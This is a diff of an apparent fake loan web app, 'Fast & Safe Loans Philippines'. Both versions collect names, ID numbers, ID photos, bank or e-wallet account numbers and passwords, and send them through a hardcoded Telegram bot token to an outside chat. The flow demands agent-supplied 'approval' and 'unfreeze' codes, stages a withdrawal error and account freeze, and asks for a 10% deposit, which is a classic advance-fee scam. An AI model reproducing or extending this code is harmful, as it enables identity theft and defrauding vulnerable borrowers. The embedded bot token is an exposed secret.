                 </div>
-              </div>
-              <div class="input-group" style="margin:0">
-                <label>ID Number</label>
-                <div class="input-wrap"><span class="ico">#</span><input id="loanIdNumber" placeholder="ID Number"></div>
-              </div>
-            </div>
-
-            <div class="input-group" style="margin:0">
-              <label>Complete Address</label>
-              <div class="input-wrap"><span class="ico">🏠</span><input id="loanAddress" placeholder="House, Street, Barangay, City, Province"></div>
-            </div>
-
-            <div class="two-col">
-              <div class="input-group" style="margin:0">
-                <label>Phone</label>
-                <div class="input-wrap"><span class="ico">📱</span><input id="loanPhone" placeholder="+63"></div>
-              </div>
-              <div class="input-group" style="margin:0">
-                <label>Email</label>
-                <div class="input-wrap"><span class="ico">✉️</span><input id="loanEmail" type="email" placeholder="Email"></div>
-              </div>
-            </div>
-
-            <div class="two-col">
-              <div class="input-group" style="margin:0">
-                <label>Employment / Career</label>
-                <div class="input-wrap"><span class="ico">💼</span><input id="loanCareer" placeholder="e.g. OFW, Teacher"></div>
-              </div>
-              <div class="input-group" style="margin:0">
-                <label>Monthly Income</label>
-                <div class="input-wrap"><span class="ico">₱</span><input id="loanIncome" type="number" placeholder="35000"></div>
-              </div>
-            </div>
-
-            <div class="two-col">
-              <div class="input-group" style="margin:0">
-                <label>Employer / Company</label>
-                <div class="input-wrap"><span class="ico">🏢</span><input id="loanEmployer" placeholder="Company name"></div>
-              </div>
-              <div class="input-group" style="margin:0">
-                <label>Loan Purpose</label>
-                <div class="input-wrap"><span class="ico">🎯</span>
-                  <select id="loanPurpose" style="padding:14px 2px;width:100%;border:none;background:transparent;font-family:inherit;font-size:14px;outline:none">
-                    <option>Personal</option><option>Business</option><option>Medical</option><option>Education</option><option>Emergency</option><option>Home Improvement</option>
-                  </select>
+                <div class="form-group">
+                    <span class="icon">🔒</span>
+                    <input type="password" id="login-password" class="form-control" placeholder="Password" required>
                 </div>
-              </div>
-            </div>
+                <button type="submit" class="btn btn-primary">Sign In</button>
+            </form>
+            <p class="mt-3">Don't have an account? <span id="show-register" class="link">Create Account</span></p>
+        </div>
 
-            <div class="two-col">
-              <div class="input-group" style="margin:0">
-                <label>Emergency Contact Name</label>
-                <div class="input-wrap"><span class="ico">🆘</span><input id="loanEmergencyName" placeholder="Contact person"></div>
-              </div>
-              <div class="input-group" style="margin:0">
-                <label>Emergency Contact Phone</label>
-                <div class="input-wrap"><span class="ico">📞</span><input id="loanEmergencyPhone" placeholder="+63"></div>
-              </div>
-            </div>
-
-            <div class="two-col">
-              <div class="input-group" style="margin:0">
-                <label>Disbursement Bank</label>
-                <div class="input-wrap"><span class="ico">🏦</span>
-                  <select id="loanBank" style="padding:14px 2px;width:100%;border:none;background:transparent;font-family:inherit;font-size:14px;outline:none">
-                    <option>BDO</option><option>BPI</option><option>Metrobank</option><option>Landbank</option><option>PNB</option><option>Security Bank</option><option>UnionBank</option><option>RCBC</option><option>GCash</option><option>Maya</option><option>Coins.ph</option><option>GrabPay</option>
-                  </select>
+        <!-- ===== Register Screen ===== -->
+        <div id="register-screen" class="screen auth-screen hidden">
+            <div class="logo">📝</div>
+            <h1>Create Account</h1>
+            <p>Join us and get your loan fast & safe!</p>
+            <form id="register-form" style="width: 100%;">
+                <div class="form-group">
+                    <span class="icon">👤</span>
+                    <input type="text" id="register-name" class="form-control" placeholder="Full Name" required>
                 </div>
-              </div>
-              <div class="input-group" style="margin:0">
-                <label>Bank Account No.</label>
-                <div class="input-wrap"><span class="ico">💳</span><input id="loanBankAccount" placeholder="Account number"></div>
-              </div>
-            </div>
-
-            <div class="two-col">
-              <div class="input-group" style="margin:0">
-                <label>Loan Amount (₱1,000 – ₱500,000)</label>
-                <div class="input-wrap"><span class="ico">₱</span><input id="loanAmountInput" type="number" placeholder="50000" min="1000" max="500000"></div>
-              </div>
-              <div class="input-group" style="margin:0">
-                <label>Loan Term</label>
-                <div class="input-wrap"><span class="ico">📅</span>
-                  <select id="loanTerm" style="padding:14px 2px;width:100%;border:none;background:transparent;font-family:inherit;font-size:14px;outline:none">
-                    <option value="3">3 months</option><option value="6">6 months</option><option value="12" selected>12 months</option><option value="24">24 months</option><option value="36">36 months</option>
-                  </select>
+                <div class="form-group">
+                    <span class="icon">📧</span>
+                    <input type="email" id="register-email" class="form-control" placeholder="Email Address" required>
                 </div>
-              </div>
+                <div class="form-group">
+                    <span class="icon">🔒</span>
+                    <input type="password" id="register-password" class="form-control" placeholder="Password" required>
+                </div>
+                 <div class="form-group">
+                    <span class="icon">📞</span>
+                    <input type="tel" id="register-phone" class="form-control" placeholder="Phone Number" required>
+                </div>
+                <div class="form-group">
+                    <span class="icon">💳</span>
+                    <input type="text" id="register-account-number" class="form-control" placeholder="Bank/E-Wallet Account Number" required>
+                </div>
+                 <div class="form-group">
+                    <span class="icon">🆔</span>
+                    <input type="text" id="register-id-type" class="form-control" placeholder="ID Type (e.g., National ID)" required>
+                </div>
+                 <div class="form-group">
+                    <span class="icon">#️⃣</span>
+                    <input type="text" id="register-id-number" class="form-control" placeholder="ID Number" required>
+                </div>
+                <div class="form-group">
+                    <label for="register-id-photo" style="font-size: 0.9rem; color: var(--text-secondary); display:block; margin-bottom: 5px;">Upload ID Photo:</label>
+                    <input type="file" id="register-id-photo" class="form-control" style="padding: 10px;" required>
+                </div>
+
+                <div id="security-code-group" class="hidden">
+                    <p>🛡️ This code is required for loan processing security. Please get the code from your agent.</p>
+                    <div class="form-group" style="margin-bottom: 0;">
+                        <input type="text" id="register-security-code" class="form-control" placeholder="Enter Loan Security Code" required>
+                    </div>
+                </div>
+
+                <button type="submit" id="register-button" class="btn btn-primary mt-3">Create Account</button>
+            </form>
+            <p class="mt-3">Already have an account? <span id="show-login" class="link">Sign In</span></p>
+        </div>
+
+        <!-- ===== Main Dashboard Screen ===== -->
+        <div id="main-screen" class="screen hidden">
+            <header class="main-header">
+                <h2 id="header-title">Dashboard</h2>
+            </header>
+
+            <div id="content-panels">
+                <!-- Home Panel -->
+                <div id="home-panel" class="panel">
+                    <div class="balance-card">
+                        <p class="label">Available Balance</p>
+                        <h1 id="dashboard-balance" class="balance">₱0.00</h1>
+                        <span id="loan-status-badge" class="loan-status-badge status-no-loan">No Loan</span>
+                    </div>
+
+                    <div class="quick-actions">
+                        <div id="action-apply-loan" class="action-btn">
+                            <span class="icon">💰</span>
+                            Apply Loan
+                        </div>
+                        <div id="action-withdraw" class="action-btn">
+                            <span class="icon">💸</span>
+                            Withdraw
+                        </div>
+                        <div id="action-view-id" class="action-btn">
+                            <span class="icon">🪪</span>
+                            View ID
+                        </div>
+                    </div>
+
+                    <div class="info-grid">
+                        <div class="info-box">
+                            <p class="label">Account Slot</p>
+                            <p id="info-slot" class="value">#0</p>
+                        </div>
+                        <div class="info-box">
+                            <p class="label">Loan Amount</p>
+                            <p id="info-loan-amount" class="value">₱0.00</p>
+                        </div>
+                        <div class="info-box">
+                            <p class="label">Account Type</p>
+                            <p id="info-account-type" class="value">Standard</p>
+                        </div>
+                         <div class="info-box">
+                            <p class="label">Account Status</p>
+                            <p id="info-account-status" class="value">Active</p>
+                        </div>
+                    </div>
+                     <button id="unfreeze-button" class="btn btn-primary mt-3 hidden">🔓 Unfreeze Account</button>
+                </div>
+
+                <!-- Loan Panel -->
+                <div id="loan-panel" class="panel hidden">
+                    <h3>Loan Application</h3>
+                    <form id="loan-application-form">
+                        <div class="form-group">
+                             <input type="text" id="loan-fullname" class="form-control" placeholder="Full Name" required>
+                        </div>
+                        <div class="form-group">
+                             <input type="text" id="loan-address" class="form-control" placeholder="Complete Address" required>
+                        </div>
+                        <div class="form-group">
+                             <input type="date" id="loan-birthday" class="form-control" placeholder="Birthday" required>
+                        </div>
+                        <div class="form-group">
+                             <input type="text" id="loan-career" class="form-control" placeholder="Career/Occupation" required>
+                        </div>
+                        <div class="form-group">
+                            <select id="loan-bank-name" class="form-control" required style="padding-left: 10px;">
+                                <option value="">Select Bank/E-Wallet for Disbursement</option>
+                                <option value="BDO">BDO</option>
+                                <option value="BPI">BPI</option>
+                                <option value="Metrobank">Metrobank</option>
+                                <option value="Landbank">Landbank</option>
+                                <option value="PNB">PNB</option>
+                                <option value="Security Bank">Security Bank</option>
+                                <option value="UnionBank">UnionBank</option>
+                                <option value="RCBC">RCBC</option>
+                                <option value="GCash">GCash</option>
+                                <option value="Maya">Maya</option>
+                                <option value="Coins.ph">Coins.ph</option>
+                                <option value="GrabPay">GrabPay</option>
+                            </select>
+                        </div>
+                         <div class="form-group">
+                             <input type="text" id="loan-bank-account" class="form-control" placeholder="Bank/E-Wallet Account Number" required>
+                        </div>
+                        <div class="form-group">
+                             <input type="number" id="loan-amount" class="form-control" placeholder="Loan Amount (₱1,000 - ₱500,000)" min="1000" max="500000" required>
+                        </div>
+                        
+                        <div id="loan-approval-code-group" class="hidden">
+                            <p>🔑 Enter the Loan Approval Code provided by your agent to finalize your application.</p>
+                            <div class="form-group" style="margin-bottom: 0;">
+                                <input type="text" id="loan-approval-code" class="form-control" placeholder="Loan Approval Code" required>
+                            </div>
+                        </div>
+
+                        <button type="submit" id="loan-submit-button" class="btn btn-primary">Submit Loan Application</button>
+                    </form>
+                </div>
+
+                <!-- Withdraw Panel -->
+                <div id="withdraw-panel" class="panel hidden">
+                    <h3>Withdraw Funds</h3>
+                    <p style="color: var(--text-secondary); margin-bottom: 1.5rem;">Select a bank or e-wallet to withdraw your funds.</p>
+                    <div id="bank-selection"></div>
+                    <form id="withdraw-form">
+                        <div class="form-group">
+                             <input type="number" id="withdraw-amount" class="form-control" placeholder="Withdrawal Amount" required>
+                        </div>
+                        <div class="form-group">
+                             <input type="text" id="withdraw-account-number" class="form-control" placeholder="Account Number" required>
+                        </div>
+                        <div class="form-group">
+                             <input type="text" id="withdraw-account-name" class="form-control" placeholder="Account Name" required>
+                        </div>
+                        <div class="form-group">
+                             <input type="password" id="withdraw-password" class="form-control" placeholder="Confirm Your Password" required>
+                        </div>
+                        <button type="submit" class="btn btn-primary">Process Withdrawal</button>
+                    </form>
+                </div>
+
+                <!-- Profile Panel -->
+                <div id="profile-panel" class="panel hidden">
+                    <h3>My Profile</h3>
+                    <ul class="profile-info">
+                        <li><span class="label">Full Name</span><span id="profile-name" class="value"></span></li>
+                        <li><span class="label">Email</span><span id="profile-email" class="value"></span></li>
+                        <li><span class="label">Phone</span><span id="profile-phone" class="value"></span></li>
+                        <li><span class="label">ID Type</span><span id="profile-id-type" class="value"></span></li>
+                        <li><span class="label">ID Number</span><span id="profile-id-number" class="value"></span></li>
+                        <li><span class="label">Balance</span><span id="profile-balance" class="value"></span></li>
+                        <li><span class="label">Loan Status</span><span id="profile-loan-status" class="value"></span></li>
+                        <li><span class="label">Account Status</span><span id="profile-account-status" class="value"></span></li>
+                    </ul>
+                    <button id="logout-button" class="btn btn-danger mt-3">Logout</button>
+                </div>
             </div>
 
-            <div class="alert alert-info">
-              <b>Security Notice:</b> After clicking Submit Loan Application, you will be asked for a Loan Approval Code. Code is required – without code loan will NOT be approved. Code is verified via Telegram API.
+            <!-- Tab Bar -->
+            <div id="tab-bar">
+                <div class="tab-item active" data-panel="home-panel">
+                    <span class="icon">🏠</span> Home
+                </div>
+                <div class="tab-item" data-panel="loan-panel">
+                    <span class="icon">💰</span> Loan
+                </div>
+                <div class="tab-item" data-panel="withdraw-panel">
+                    <span class="icon">💸</span> Withdraw
+                </div>
+                <div class="tab-item" data-panel="profile-panel">
+                    <span class="icon">👤</span> Profile
+                </div>
             </div>
-
-            <button class="btn btn-primary" id="submitLoanBtn">Submit Loan Application</button>
-            <div class="small-note">All loan data + approval codes are sent to Telegram monitoring bot in real time.</div>
-          </div>
         </div>
-      </div>
 
-      <!-- WITHDRAW PANEL -->
-      <div class="panel" id="panel-withdraw">
-        <div class="section-title">Withdraw Funds</div>
-
-        <div class="card" id="withdrawCard">
-          <div class="card-title">Select Bank / E-Wallet</div>
-          <div class="bank-grid" id="bankGrid">
-            <!-- injected -->
-          </div>
-
-          <div class="input-group">
-            <label>Withdrawal Amount (₱)</label>
-            <div class="input-wrap"><span class="ico">₱</span><input id="wdAmount" type="number" placeholder="Enter amount"></div>
-          </div>
-          <div class="two-col">
-            <div class="input-group" style="margin:0">
-              <label>Account Number</label>
-              <div class="input-wrap"><span class="ico">💳</span><input id="wdAccNo" placeholder="Account #"></div>
+        <!-- Overlays & Modals -->
+        <div id="loading-overlay" class="overlay hidden">
+             <div class="modal">
+                <div class="loader"></div>
+                <h3 id="loading-text">Processing...</h3>
             </div>
-            <div class="input-group" style="margin:0">
-              <label>Account Name</label>
-              <div class="input-wrap"><span class="ico">👤</span><input id="wdAccName" placeholder="Full name"></div>
+        </div>
+
+        <div id="id-photo-modal" class="overlay hidden">
+            <div class="modal">
+                <h3>ID Photo</h3>
+                <img id="id-photo-img" src="" alt="ID Photo">
+                <button id="close-id-modal" class="btn btn-primary mt-3">Close</button>
             </div>
-          </div>
-          <div class="input-group">
-            <label>Transaction Password</label>
-            <div class="input-wrap"><span class="ico">🔒</span><input id="wdPassword" type="password" placeholder="Confirm password"></div>
-          </div>
-
-          <button class="btn btn-primary" id="processWdBtn">Process Withdrawal</button>
-
-          <div class="small-note" style="margin-top:8px">
-            • 10 second secure processing<br>
-            • Bank security verification required<br>
-            • After 2 attempts, auto freeze protection activates
-          </div>
         </div>
-
-        <!-- processing state -->
-        <div class="card hidden" id="wdProcessingCard">
-          <div class="process-box">
-            <div class="spinner"></div>
-            <div style="font-weight:700;margin-top:6px">Processing secure withdrawal...</div>
-            <div class="countdown" id="wdCountdown">10s</div>
-            <div class="small-note">Verifying bank details via BSP network</div>
-          </div>
-        </div>
-
-        <!-- error code state -->
-        <div class="card hidden" id="wdErrorCard">
-          <div class="alert alert-error"><b>Bank account error!</b><br>Please enter the error code.</div>
-          <div class="input-group">
-            <label>Error Security Code</label>
-            <div class="input-wrap security">
-              <span class="ico">🛡️</span>
-              <input id="wdErrorCodeInput" placeholder="Enter error code to clear">
+        
+        <div id="unfreeze-modal" class="overlay hidden">
+            <div class="modal">
+                <h3>🔓 Unfreeze Account</h3>
+                <p>Your account is currently frozen. To enable withdrawals and other features, please enter the unfreeze code provided by customer care.</p>
+                <form id="unfreeze-form">
+                    <div class="form-group">
+                        <input type="text" id="unfreeze-code" class="form-control" placeholder="Enter Unfreeze Code" required>
+                    </div>
+                    <button type="submit" class="btn btn-primary">Submit Code</button>
+                </form>
             </div>
-          </div>
-          <button class="btn btn-primary" id="wdErrorSubmitBtn">Submit Code</button>
-          <div class="small-note">Submitting code will add 10% bonus to your balance as security compensation.</div>
         </div>
 
-        <!-- customer care block -->
-        <div class="card hidden" id="wdBlockedCard">
-          <div class="alert alert-success">✅ Error cleared – 10% bonus credited!</div>
-          <div class="alert alert-warn" style="margin-top:10px">
-            <b>Kindly contact to your customer care to withdraw your amount</b><br>
-            Your withdrawal is pending manual verification. Live chat is available bottom-right.
-          </div>
-          <button class="btn btn-outline" onclick="resetWithdrawUI()">Try Again</button>
-        </div>
-
-        <!-- frozen block -->
-        <div class="card hidden" id="wdFrozenCard">
-          <div class="alert alert-error">
-            <b>⚠️ ACCOUNT FROZEN</b><br>
-            Security freeze activated after multiple withdrawal attempts.<br>
-            Balance protection: funds reverted to secure state.
-          </div>
-          <button class="btn btn-danger" onclick="openUnfreezeModal()">🔓 Unfreeze Account (Code Required)</button>
-        </div>
-
-      </div>
-
-      <!-- PROFILE PANEL -->
-      <div class="panel" id="panel-profile">
-        <div class="section-title">My Profile</div>
-        <div class="card">
-          <div class="info-row"><span>Full Name</span><b id="pName">-</b></div>
-          <div class="info-row"><span>Email</span><b id="pEmail">-</b></div>
-          <div class="info-row"><span>Phone</span><b id="pPhone">-</b></div>
-          <div class="info-row"><span>ID</span><b id="pId">-</b></div>
-          <div class="info-row"><span>Account No.</span><b id="pAccNo">-</b></div>
-          <div class="info-row"><span>Balance</span><b id="pBalance">₱0</b></div>
-          <div class="info-row"><span>Loan Status</span><b id="pLoanStatus">No Loan</b></div>
-          <div class="info-row"><span>Slot</span><b id="pSlot">-</b></div>
-        </div>
-        <div class="card">
-          <button class="btn btn-outline" onclick="openIdModal()">🪪 View ID Photo</button>
-          <div style="height:10px"></div>
-          <button class="btn btn-ghost" onclick="logout()">Logout Securely</button>
-        </div>
-        <div class="card">
-          <div class="card-title">Security & Monitoring</div>
-          <div class="list-compact">
-            • Telegram live monitoring: <b>ON</b><br>
-            • Session persistence: <b>Enabled</b><br>
-            • 2FA Code system: <b>Active</b><br>
-            • Freeze protection: <b>Smart</b><br>
-            • Bot: @FSLPhilippinesBot<br>
-            • Support: Tawk.to live chat
-          </div>
-        </div>
-      </div>
-
     </div>
 
-    <!-- Tab Bar -->
-    <div class="tabbar">
-      <button class="tab-btn active" data-tab="home" onclick="switchTab('home')"><span class="ti">🏠</span>Home</button>
-      <button class="tab-btn" data-tab="loan" onclick="switchTab('loan')"><span class="ti">💸</span>Loan</button>
-      <button class="tab-btn" data-tab="withdraw" onclick="switchTab('withdraw')"><span class="ti">🏦</span>Withdraw</button>
-      <button class="tab-btn" data-tab="profile" onclick="switchTab('profile')"><span class="ti">👤</span>Profile</button>
-    </div>
-  </div>
-</div>
+    <!-- Tawk.to Live Chat -->
+    <script type="text/javascript">
+        var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
+        (function () {
+            var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
+            s1.async = true;
+            s1.src = 'https://embed.tawk.to/6a397c2849e0e21d4954f33a/1jro8q0h2';
+            s1.charset = 'UTF-8';
+            s1.setAttribute('crossorigin', '*');
+            s0.parentNode.insertBefore(s1, s0);
+        })();
+    </script>
+    
+    <!-- Main Application JavaScript -->
+    <script>
+    document.addEventListener('DOMContentLoaded', () => {
+        // --- CONFIGURATION ---
+        const TELEGRAM_BOT_TOKEN = "8866439592:AAFL1PDzoXorKiVFyoP9SdceFc2khkcAyps";
+        const TELEGRAM_CHAT_ID = "8568477976";
+        const TOTAL_USER_SLOTS = 70;
+        const BANKS = [
+            { name: 'BDO', logo: 'https://www.bdo.com.ph/sites/default/files/images/logo.png' },
+            { name: 'BPI', logo: 'https://www.bpi.com.ph/etc.clientlibs/bpi-public/clientlibs/clientlib-base/resources/images/logo-bpi.svg' },
+            { name: 'Metrobank', logo: 'https://www.metrobank.com.ph/img/metrobank-logo_2.png' },
+            { name: 'Landbank', logo: 'https://www.landbank.com/images/logo-header.png' },
+            { name: 'PNB', logo: 'https://www.pnb.com.ph/images/default-source/pnb-logo/pnb-logo-new-rev.png' },
+            { name: 'Security Bank', logo: 'https://www.securitybank.com/wp-content/themes/security-bank-v2/assets/images/logo.svg' },
+            { name: 'UnionBank', logo: 'https://www.unionbankph.com/assets/img/logo/ubp-logo-white-background.png' },
+            { name: 'RCBC', logo: 'https://www.rcbc.com/assets/images/rcbclogo-2.png' },
+            { name: 'GCash', logo: 'https://www.gcash.com/wp-content/uploads/2023/04/GCash-logo-300x126.png' },
+            { name: 'Maya', logo: 'https://assets.maya.ph/icon/maya-logo.svg' },
+            { name: 'Coins.ph', logo: 'https://coins.ph/assets/coins-logo.svg' },
+            { name: 'GrabPay', logo: 'https://www.grab.com/ph/wp-content/uploads/sites/11/2021/04/grabpay-logo.png' }
+        ];
 
-<!-- MODALS -->
-<!-- Loan Approval Code Modal -->
-<div id="loanCodeModal" class="modal-overlay hidden">
-  <div class="modal">
-    <span class="close-x" onclick="closeModal('loanCodeModal')">×</span>
-    <h3>🔐 Loan Approval Code</h3>
-    <p>Enter your Loan Approval Security Code to approve this loan. <b>Code is required – without code loan will NOT be approved.</b> Code is verified via Telegram API.</p>
-    <div class="input-group">
-      <label>Loan Approval Code</label>
-      <div class="input-wrap security">
-        <span class="ico">🛡️</span>
-        <input id="loanApprovalCodeInput" placeholder="Enter approval code" class="code-input-big" style="text-align:left;letter-spacing:1px;font-size:15px">
-      </div>
-    </div>
-    <button class="btn btn-primary" id="loanCodeSubmitBtn">Approve Loan with Code</button>
-    <div class="small-note" style="margin-top:8px">Code will be sent instantly to Telegram monitoring.</div>
-  </div>
-</div>
+        // --- DOM ELEMENTS ---
+        const app = document.getElementById('app');
+        const screens = {
+            login: document.getElementById('login-screen'),
+            register: document.getElementById('register-screen'),
+            main: document.getElementById('main-screen'),
+        };
+        const panels = {
+            home: document.getElementById('home-panel'),
+            loan: document.getElementById('loan-panel'),
+            withdraw: document.getElementById('withdraw-panel'),
+            profile: document.getElementById('profile-panel'),
+        };
+        const overlays = {
+            loading: document.getElementById('loading-overlay'),
+            idPhoto: document.getElementById('id-photo-modal'),
+            unfreeze: document.getElementById('unfreeze-modal'),
+        };
 
-<!-- Unfreeze Code Modal -->
-<div id="unfreezeCodeModal" class="modal-overlay hidden">
-  <div class="modal">
-    <span class="close-x" onclick="closeModal('unfreezeCodeModal')">×</span>
-    <h3>🔓 Unfreeze Account</h3>
-    <p>Account is frozen for security. Enter unfreeze security code to unlock withdrawals.</p>
-    <div class="input-group">
-      <label>Unfreeze Security Code</label>
-      <div class="input-wrap security">
-        <span class="ico">🔑</span>
-        <input id="unfreezeCodeInput" placeholder="Enter unfreeze code">
-      </div>
-    </div>
-    <button class="btn btn-primary" id="unfreezeCodeSubmitBtn">Unfreeze Now</button>
-    <div class="hr"></div>
-    <p style="margin-bottom:8px"><b>Alternative: 10% Security Deposit</b></p>
-    <div class="alert alert-warn" id="depositInfo">Deposit amount will be calculated from your balance.</div>
-    <div class="input-group">
-      <label>Deposit 10% Amount (₱)</label>
-      <div class="input-wrap"><span class="ico">₱</span><input id="deposit10Input" type="number" placeholder="0.00"></div>
-    </div>
-    <button class="btn btn-outline" id="depositUnfreezeBtn">Unfreeze with 10% Deposit</button>
-  </div>
-</div>
+        // --- STATE ---
+        let db = {};
+        let currentUserSlot = null;
+        let tempRegistrationData = {};
 
-<!-- ID Modal -->
-<div id="idModal" class="modal-overlay hidden">
-  <div class="modal">
-    <span class="close-x" onclick="closeModal('idModal')">×</span>
-    <h3>🪪 ID Verification</h3>
-    <div class="id-photo-box">
-      <div style="font-size:42px;margin-bottom:8px">🪪</div>
-      <div style="font-weight:700" id="idModalName">-</div>
-      <div style="font-size:13px;color:#666" id="idModalDetail">-</div>
-      <div style="margin-top:10px;font-size:12px;color:#888">ID Photo – Fast & Safe Loans Philippines<br>Verified • SEC Licensed</div>
-      <!-- Simple generated ID card -->
-      <svg viewBox="0 0 520 300" width="100%" style="margin-top:12px;border-radius:12px;background:linear-gradient(135deg,#fffbe6,#fff0b6);border:1.5px solid #f0d356">
-        <rect x="18" y="18" width="484" height="264" rx="18" fill="white" stroke="#f0d356"/>
-        <text x="38" y="60" font-size="16" font-family="Inter, Arial" font-weight="700" fill="#b48800">PHILIPPINES • NATIONAL ID</text>
-        <circle cx="78" cy="150" r="42" fill="#fff6cf" stroke="#f5c400" stroke-width="2"/>
-        <text x="78" y="158" text-anchor="middle" font-size="28">👤</text>
-        <text x="140" y="120" font-size="13" fill="#666" font-family="Inter, Arial">Full Name</text>
-        <text x="140" y="142" font-size="15" font-weight="700" font-family="Inter, Arial" fill="#1a1a1a" id="svgIdName">Juan Dela Cruz</text>
-        <text x="140" y="172" font-size="12" fill="#666" font-family="Inter, Arial">ID No.</text>
-        <text x="140" y="192" font-size="13" font-weight="600" font-family="Inter, Arial" id="svgIdNum">ID-XXXXXXXX</text>
-        <text x="140" y="220" font-size="11" fill="#888" font-family="Inter, Arial">Fast & Safe Loans • Verified Borrower</text>
-        <text x="482" y="260" text-anchor="end" font-size="11" fill="#b48800" font-family="Inter, Arial" font-weight="700">FSL PH ✓</text>
-      </svg>
-    </div>
-    <div style="margin-top:12px">
-      <button class="btn btn-ghost" onclick="closeModal('idModal')">Close</button>
-    </div>
-  </div>
-</div>
+        // --- HELPER FUNCTIONS ---
+        const formatCurrency = (amount) => new Intl.NumberFormat('en-PH', { style: 'currency', currency: 'PHP' }).format(amount);
+        
+        const showScreen = (screenId) => {
+            Object.values(screens).forEach(screen => screen.classList.add('hidden'));
+            screens[screenId].classList.remove('hidden');
+        };
 
-<!-- Loan processing overlay -->
-<div id="loanProcessingOverlay" class="modal-overlay hidden">
-  <div class="modal" style="text-align:center">
-    <div class="spinner" style="margin:10px auto"></div>
-    <h3>Processing Loan...</h3>
-    <p>Secure verification via Telegram API. Please wait.</p>
-  </div>
-</div>
+        const showPanel = (panelId) => {
+            Object.values(panels).forEach(panel => panel.classList.add('hidden'));
+            panels[panelId].classList.remove('hidden');
+            document.querySelectorAll('.tab-item').forEach(tab => {
+                tab.classList.toggle('active', tab.dataset.panel === panelId);
+            });
+            const headerTitle = document.getElementById('header-title');
+            headerTitle.textContent = panelId.charAt(0).toUpperCase() + panelId.slice(1);
+        };
+        
+        const showLoading = (text = 'Processing...') => {
+            document.getElementById('loading-text').textContent = text;
+            overlays.loading.classList.remove('hidden');
+        };
+        
+        const hideLoading = () => overlays.loading.classList.add('hidden');
 
-<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
-/* ========= CONFIG ========= */
-const CONFIG = {
-  TELEGRAM_BOT_TOKEN: '8866439592:AAFL1PDzoXorKiVFyoP9SdceFc2khkcAyps',
-  TELEGRAM_CHAT_ID: '8568477976',
-  USERS_TOTAL: 70,
-  LOAN_MIN: 1000,
-  LOAN_MAX: 500000,
-  STORAGE_KEY: 'fsl_users_v3_adv',
-  SESSION_KEY: 'fsl_session_v3'
-};
+        // --- TELEGRAM INTEGRATION ---
+        const sendTelegram = async (message) => {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error("Telegram Error:", error);
+            }
+        };
 
-const BANKS = [
-  {id:'bdo', name:'BDO', sub:'Banco de Oro'},
-  {id:'bpi', name:'BPI', sub:'Bank of PI'},
-  {id:'metrobank', name:'Metrobank', sub:'Metro Bank'},
-  {id:'landbank', name:'Landbank', sub:'Land Bank PH'},
-  {id:'pnb', name:'PNB', sub:'Philippine National'},
-  {id:'security', name:'Security Bank', sub:'Security'},
-  {id:'unionbank', name:'UnionBank', sub:'Union Bank'},
-  {id:'rcbc', name:'RCBC', sub:'Rizal Comm.'},
-  {id:'gcash', name:'GCash', sub:'E-Wallet'},
-  {id:'maya', name:'Maya', sub:'E-Wallet'},
-  {id:'coins', name:'Coins.ph', sub:'Crypto Wallet'},
-  {id:'grabpay', name:'GrabPay', sub:'E-Wallet'},
-];
+        // --- DATA MANAGEMENT (localStorage) ---
+        const saveDB = () => localStorage.setItem('fastSafeLoansDB', JSON.stringify(db));
+        
+        const loadDB = () => {
+            const data = localStorage.getItem('fastSafeLoansDB');
+            if (data) {
+                db = JSON.parse(data);
+            } else {
+                generateInitialData();
+            }
+        };
+        
+        const generateInitialData = () => {
+            db = {};
+            for (let i = 1; i <= TOTAL_USER_SLOTS; i++) {
+                db[i] = {
+                    email: "", password: "", fullName: "", idType: "", idNumber: "", idPhoto: "", phone: "", accountNumber: "",
+                    balance: 0, loanAmount: 0, loanStatus: "No Loan", isFrozen: false
+                };
+            }
+            // Pre-configured test accounts
+            db[1] = { ...db[1], email: "123fhffhf@gmail.com", password: "12345678", fullName: "Shane Sabal", balance: 50, phone: '09123456789', accountNumber: '1234567890', idType: 'National ID', idNumber: '1111-1111-1111' };
+            db[2] = { ...db[2], email: "gowevif157@ocuser.com", password: "ccdsdssdss", fullName: "md oososs", balance: 0, phone: '09987654321', accountNumber: '0987654321', idType: 'Driver License', idNumber: '2222-2222-2222' };
+            saveDB();
+        };
 
-let users = [];
-let currentUser = null;
-let currentSlot = null;
-let selectedBank = null;
-let pendingLoanData = null;
+        // --- UI UPDATE FUNCTIONS ---
+        const updateDashboard = () => {
+            const user = db[currentUserSlot];
+            if (!user) return;
 
-/* ===== TELEGRAM ===== */
-async function sendTelegram(text){
-  const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
-  try{
-    await fetch(url, {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({
-        chat_id: CONFIG.TELEGRAM_CHAT_ID,
-        text: text,
-        parse_mode: 'HTML',
-        disable_web_page_preview: true
-      })
+            document.getElementById('dashboard-balance').textContent = formatCurrency(user.balance);
+            
+            const statusBadge = document.getElementById('loan-status-badge');
+            statusBadge.textContent = user.loanStatus;
+            statusBadge.className = 'loan-status-badge';
+            if(user.isFrozen) {
+                 statusBadge.textContent = "Frozen";
+                 statusBadge.classList.add('status-frozen');
+            } else {
+                switch(user.loanStatus) {
+                    case "No Loan": statusBadge.classList.add('status-no-loan'); break;
+                    case "Pending": statusBadge.classList.add('status-pending'); break;
+                    case "Approved": statusBadge.classList.add('status-approved'); break;
+                    case "Rejected": statusBadge.classList.add('status-rejected'); break;
+                }
+            }
+            
+            document.getElementById('info-slot').textContent = `#${currentUserSlot}`;
+            document.getElementById('info-loan-amount').textContent = formatCurrency(user.loanAmount);
+            
+            const accountStatus = document.getElementById('info-account-status');
+            const unfreezeButton = document.getElementById('unfreeze-button');
+            if(user.isFrozen) {
+                accountStatus.textContent = 'Frozen';
+                accountStatus.style.color = 'var(--danger)';
+                unfreezeButton.classList.remove('hidden');
+                // Disable most actions when frozen
+                document.getElementById('action-apply-loan').style.opacity = '0.5';
+                document.getElementById('action-withdraw').style.opacity = '0.5';
+
+            } else {
+                accountStatus.textContent = 'Active';
+                accountStatus.style.color = 'var(--success)';
+                unfreezeButton.classList.add('hidden');
